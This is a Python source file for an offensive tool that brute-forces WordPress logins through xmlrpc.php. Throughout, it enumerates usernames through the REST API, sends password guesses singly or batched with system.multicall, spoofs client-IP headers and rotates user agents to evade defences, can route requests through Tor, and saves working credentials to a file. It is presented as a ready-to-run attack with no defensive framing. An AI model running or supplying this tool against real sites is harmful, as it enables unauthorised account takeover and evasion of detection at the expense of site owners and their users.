import asyncio
import aiohttp
import time
import os
import random
import logging
import json
import subprocess
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
from termcolor import colored
import urllib3
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import banner
from aiohttp_socks import (
    ProxyConnector,
    ProxyType,
)  # Import the ProxyConnector and ProxyType

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

SUCCESS_LOG = "successful_logins.json"  # to save the user:pass successful combos
WAF_DETECTED_LOG = "waf_detected.log"

# Set up logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


def print_colored_bold(text, color=Fore.GREEN):
    print(colored(text, color, attrs=["bold"]))


def generate_random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))


def generate_random_headers(target_url):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",  # IE 11
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/78.0.3904.108 Chrome/78.0.3904.108 Safari/537.36",  # Chromium
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.92",  # Opera
        "Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0",  # Mobile Firefox
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36",  # Android Chrome
        "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1",  # iPad Safari
        "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",  # PlayStation
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",  # Googlebot
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",  # Bingbot
    ]

    referer_domains = [
        "https://google.com",
        "https://bing.com", 
        "https://duckduckgo.com",
        "https://www.startpage.com/",
        "https://yahoo.com",
        "https://baidu.com",
        "https://yandex.com",
        "https://ecosia.org",
        "https://qwant.com",
        "https://search.brave.com",
        "https://swisscows.com",
        "https://metager.org",
        "https://mojeek.com",
        "https://gibiru.com",
        "https://searchencrypt.com",
        "https://lukol.com",
        "https://oscobo.com",
        "https://disconnect.me",
        "https://peekier.com",
        "https://boardreader.com"
    ]

    parsed_url = urlparse(target_url)
    if parsed_url.scheme and parsed_url.netloc:
        referer_domains.append(f"{parsed_url.scheme}://{parsed_url.netloc}")

    headers = {
        "Content-Type": "text/xml",
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "X-Forwarded-For": generate_random_ip(),
        "X-Real-IP": generate_random_ip(),
        "Referer": random.choice(referer_domains),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.7"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "br"]),
        "X-Client-IP": generate_random_ip(),
        "CF-Connecting-IP": generate_random_ip(),
        "True-Client-IP": generate_random_ip(),
        "Forwarded": f"for={generate_random_ip()};proto=https",
        "DNT": random.choice(["1", "0"]),  # Do Not Track
    }
    if random.choice([True, False]):
        headers["Origin"] = random.choice(referer_domains)
    if random.choice([True, False]):
        headers["Cache-Control"] = random.choice(["no-cache", "max-age=0", "no-store"])

    return headers


async def check_xmlrpc_available(url, session, retries=3, delay=2):
    headers = generate_random_headers(url)
    
    # Define different payload variations
    payload_variations = [
        """
        <methodCall>
          <methodName>system.listMethods</methodName>
          <params></params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.getCapabilities</methodName>
          <params></params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.methodHelp</methodName>
          <params>
            <param>
              <value><string>system.listMethods</string></value>
            </param>
          </params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.methodSignature</methodName>
          <params>
            <param>
              <value><string>system.listMethods</string></value>
            </param>
          </params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.methodSignature</methodName>
          <params>
            <param>
              <value><string>system.getCapabilities</string></value>
            </param>
          </params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.methodSignature</methodName>
          <params>
            <param>
              <value><string>system.methodHelp</string></value>
            </param>
          </params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.multicall</methodName>
          <params>
            <param>
              <value>
                <array>
                  <data>
                    <value>
                      <struct>
                        <member>
                          <name>methodName</name>
                          <value><string>system.listMethods</string></value>
                        </member>
                      </struct>
                    </value>
                    <value>
                      <struct>
                        <member>
                          <name>methodName</name>
                          <value><string>system.getCapabilities</string></value>
                        </member>
                      </struct>
                    </value>
                  </data>
                </array>
              </value>
            </param>
          </params>
        </methodCall>
        """
    ]
    
    for attempt in range(retries):
        try:
            # Randomly select a payload variation
            data = random.choice(payload_variations)
            
            async with session.post(url, headers=headers, data=data, timeout=30, ssl=False) as response:
                logging.info(f"Attempt {attempt + 1}: Checking XML-RPC at {url}, Status Code: {response.status}")
                if response.status == 200:
                    return True
                elif response.status == 429:  # Too Many Requests
                    retry_after = response.headers.get("Retry-After")
                    if retry_after:
                        logging.warning(f"Rate limited. Retrying after {retry_after} seconds.")
                        await asyncio.sleep(int(retry_after))
                    else:
                        logging.warning("Rate limited. Retrying after default delay.")
                        await asyncio.sleep(delay)
                else:
                    response_body = await response.text()
                    logging.error(f"XML-RPC check failed at {url}. Response body: {response_body}")
                    if "405" in response_body or response.status == 405:
                        logging.warning("Method Not Allowed - Server might be blocking the request method.")
                    return False
        except asyncio.TimeoutError:
            logging.error(f"Timeout occurred while checking XML-RPC for {url} on attempt {attempt + 1}")
        except aiohttp.ClientError as e:
            logging.error(f"Error checking XML-RPC on attempt {attempt + 1}: {e}")

        # Wait before retrying
        await asyncio.sleep(delay)
    
    return False


async def get_wp_users(url, session):
    headers = generate_random_headers(url)
    api_url = url + "/wp-json/wp/v2/users"
    try:
        async with session.get(api_url, headers=headers, ssl=False) as response:
            if response.status == 200:
                users = [user["slug"] for user in await response.json()]
                return users
            else:
                logging.error(f"Failed to fetch users. Status code: {response.status}")
                return []
    except aiohttp.ClientError as e:
        logging.error(f"Error fetching users: {e}")
        return []


async def brute_force_login(url, username, password, session):
    headers = generate_random_headers(url)
    # Payload variation
    if random.choice([True, False]):
        data = f"""
            <methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{username}</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>
           """
    else:
        data = f"""
          <methodCall>
              <methodName>wp.getUsersBlogs</methodName>
              <params>
                  <param><value><string>{username}</string></value></param>
                  <param><value><string>{password}</string></value></param>
              </params>
          </methodCall>
          """
    try:
        start_time = time.time()
        async with session.post(url, data=data, headers=headers, ssl=False) as response:
            response_time = time.time() - start_time
            response_text = await response.text()
            return response_text, response_time, response.status
    except aiohttp.ClientError as e:
        logging.error(f"Error during login attempt for {username}:{password}: {e}")
        return None, None, None


async def exploit_multicall(url, usernames, passwords, session):
    headers = generate_random_headers(url)
    method_calls = ""
    for username in usernames:
        for password in passwords:
            # Payload variation
            if random.choice([True, False]):
                method_calls += f"""
                  <methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{username}</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>
                 """
            else:
                method_calls += f"""
                <methodCall>
                   <methodName>wp.getUsersBlogs</methodName>
                    <params>
                        <param><value><string>{username}</string></value></param>
                        <param><value><string>{password}</string></value></param>
                    </params>
                </methodCall>
                """

    data = f"""
        <methodCall>
            <methodName>system.multicall</methodName>
            <params>
                <param>
                    <value>
                        <array>
                            <data>
                               {method_calls}
                            </data>
                        </array>
                    </value>
                </param>
            </params>
        </methodCall>
    """

    try:
        start_time = time.time()
        async with session.post(url, data=data, headers=headers, ssl=False) as response:
            response_time = time.time() - start_time
            response_text = await response.text()
            return response_text, response_time, response.status
    except aiohttp.ClientError as e:
        logging.error(f"Error during multicall attempt: {e}")
        return None, None, None


async def analyze_response_times(response_times):
    # Placeholder for timing attack analysis
    if response_times:
        average_time = sum(response_times) / len(response_times)
        sorted_times = sorted(response_times)
        median_time = (
            sorted_times[len(sorted_times) // 2]
            if len(sorted_times) % 2 != 0
            else (
                sorted_times[len(sorted_times) // 2 - 1]
                + sorted_times[len(sorted_times) // 2]
            )
            / 2
        )

        logging.info(f"Average Response Time: {average_time:.4f} seconds")
        logging.info(f"Median Response Time: {median_time:.4f} seconds")
        # Look for significant time variations in response
        time_deviations = [abs(time - average_time) for time in response_times]
        max_deviation_index = time_deviations.index(max(time_deviations))
        logging.info(
            f"Max deviation detected at response: {max_deviation_index+1}, time: {response_times[max_deviation_index]:.4f}"
        )


async def save_successful_login(username, password):
    try:
        if os.path.exists(SUCCESS_LOG):
            with open(SUCCESS_LOG, "r") as f:
                successful_logins = json.load(f)
        else:
            successful_logins = []
        successful_logins.append({"username": username, "password": password})
        with open(SUCCESS_LOG, "w") as f:
            json.dump(successful_logins, f, indent=4)
        logging.info(f"Credentials {username}:{password} added to {SUCCESS_LOG}")
    except Exception as e:
        logging.error(
            f"Error while writing successful login {username}:{password}: {e}"
        )


async def brute_force_task(
    url,
    username,
    password,
    session,
    total_attempts,
    start_time,
    progress_print_interval,
):
    response_text, response_time, response_status = await brute_force_login(
        url, username, password, session
    )
    total_attempts[0] += 1
    if response_text and "Dashboard" in response_text:
        print(f"\n{Fore.GREEN}Login successful with {username}:{password}")
        await save_successful_login(username, password)
        return True

    if time.time() - start_time[0] > progress_print_interval:
        elapsed_time = time.time() - start_time[0]
        minutes, seconds = divmod(int(elapsed_time), 60)
        attempts_per_second = total_attempts[0] / (
            elapsed_time if elapsed_time > 0 else 1
        )
        print(
            f"\r{Fore.CYAN}Passwords Checked: {total_attempts[0]} | Elapsed: {minutes:02}:{seconds:02} | Attempts/second: {attempts_per_second:.2f}",
            end="",
        )
        start_time[0] = time.time()

    return False

async def start_bruteforce_async(url, usernames, passwords, threads, use_tor=False):
    # Initialize start time and total attempts
    start_time = [time.time()]
    total_attempts = [0]
    progress_print_interval = 0.5  # time interval for progress reports

    # Set up the proxy connector if using Tor
    if use_tor:
        parsed_url = urlparse("socks5://127.0.0.1:9050")
        connector = ProxyConnector(
            proxy_type=ProxyType.SOCKS5,
            host=parsed_url.hostname,
            port=parsed_url.port,
        )
    else:
        connector = None

    # Create an aiohttp session with the connector
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        # Create brute force tasks for each username and password combination
        for username in usernames:
            for password in passwords:
                task = asyncio.create_task(
                    brute_force_task(
                        url,
                        username,
                        password,
                        session,
                        total_attempts,
                        start_time,
                        progress_print_interval,
                    )
                )
                tasks.append(task)

        # Run all tasks concurrently
        await asyncio.gather(*tasks)


async def start_multicall_async(url, usernames, passwords, session, use_tor=False):
    # Attempt to exploit the multicall method
    response_text, response_time, response_status = await exploit_multicall(
        url, usernames, passwords, session
    )

    if response_text:
        print(
            f"\n{Fore.GREEN}Multicall response {response_status}: {response_text[:200]}..."
        )  # Print only the first 200 chars for readability

        # Analyze the response, look for any successes
        if "Dashboard" in response_text:
            for username in usernames:
                for password in passwords:
                    if (
                        f"<string>{username}</string>" in response_text
                        and f"<string>{password}</string>" in response_text
                    ):
                        print(
                            f"\n{Fore.GREEN}Multicall login successful with {username}:{password}"
                        )
                        await save_successful_login(username, password)

        return response_time
    return None


async def check_for_waf(url, session, use_tor=False):
    try:
        # Define headers for the request
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
        }
        # Send a GET request to the URL
        async with session.get(url, headers=headers, timeout=15, ssl=False) as response:
            if response.status == 403:
                logging.warning(f"WAF Detected with status {response.status} for {url}")
                with open(WAF_DETECTED_LOG, "a") as f:
                    f.write(f"WAF Detected with status {response.status} for {url}\n")
                return True
            return False

    except aiohttp.ClientError as e:
        logging.error(f"Error when testing for WAF : {e}")
        return False


async def main():
    # Print the banner
    banner.print_banner()
    # Get the target URL from the user
    url = input(
        f"{Fore.YELLOW}Enter the target WordPress website URL (e.g., https://example.com): "
    )
    # Ask the user if they want to use Tor
    use_tor = input(f"{Fore.YELLOW}Do you want to use Tor? (y/n): ").lower() == "y"
    if use_tor:
        print_colored_bold(
            f"{Fore.YELLOW}Using Tor to anonymize the requests", color="yellow"
        )

    # Set up the proxy connector if using Tor
    if use_tor:
        parsed_url = urlparse("socks5://127.0.0.1:9050")
        connector = ProxyConnector(
            proxy_type=ProxyType.SOCKS5,
            host=parsed_url.hostname,
            port=parsed_url.port,
        )
    else:
        connector = None

    # Create an aiohttp session with the connector
    async with aiohttp.ClientSession(connector=connector) as session:

        # Check for WAF detection
        waf_detected = await check_for_waf(url, session)
        if waf_detected:
            print(f"{Fore.YELLOW}WAF detected, proceed with caution")

        # Check if xmlrpc.php is available
        if await check_xmlrpc_available(url + "/xmlrpc.php", session):
            print_colored_bold(
                f"{Fore.GREEN}xmlrpc.php is available, proceeding with brute-force!",
                color="green",
            )
        else:
            print(f"{Fore.RED}xmlrpc.php is not available. Exiting...")
            return

        # Ask the user if they want to list users from WP JSON API
        use_wp_api = input(
            f"{Fore.YELLOW}Do you want to list users from WP JSON API? (y/n): "
        ).lower()

        if use_wp_api == "y":
            users = await get_wp_users(url, session)
            if users:
                print(f"{Fore.CYAN}Found users: {', '.join(users)}")
            else:
                print(f"{Fore.RED}No users found from WP API.")
                return
        else:
            # Ask the user if they want to provide a username file or enter manually
            username_choice = input(
                f"{Fore.YELLOW}Do you want to provide a username file or enter manually? (f/m): "
            ).lower()
            if username_choice == "f":
                username_file = input(
                    f"{Fore.YELLOW}Enter the path to the username file: "
                )
                with open(username_file, "r") as file:
                    users = [line.strip() for line in file.readlines()]
            else:
                users = [input(f"{Fore.YELLOW}Enter a username: ")]

        # Ask the user if they want to provide a password file or use default
        password_choice = input(
            f"{Fore.YELLOW}Do you want to provide a password file or use default (wppass.txt)? (f/d): "
        ).lower()
        if password_choice == "f":
            password_file = input(f"{Fore.YELLOW}Enter the path to the password file: ")
            with open(password_file, "r") as file:
                passwords = [line.strip() for line in file.readlines()]
        else:
            if os.path.exists("wppass.txt"):
                with open("wppass.txt", "r") as file:
                    passwords = [line.strip() for line in file.readlines()]
            else:
                print(
                    f"{Fore.RED}Default password file (wppass.txt) not found. Exiting..."
                )
                return

        # Get the number of threads to use from the user
        threads = int(input(f"{Fore.YELLOW}Enter the number of threads to use: "))

        # Ask the user if they want to use system.multicall
        multicall_choice = input(
            f"{Fore.YELLOW}Do you want to use system.multicall? (y/n): "
        ).lower()

        if multicall_choice == "y":
            response_time = await start_multicall_async(
                url + "/xmlrpc.php", users, passwords, session
            )
            if response_time:
                logging.info("Analyzing response times")
                await analyze_response_times([response_time])
        else:
            await start_bruteforce_async(url + "/xmlrpc.php", users, passwords, threads)


if __name__ == "__main__":
    asyncio.run(main())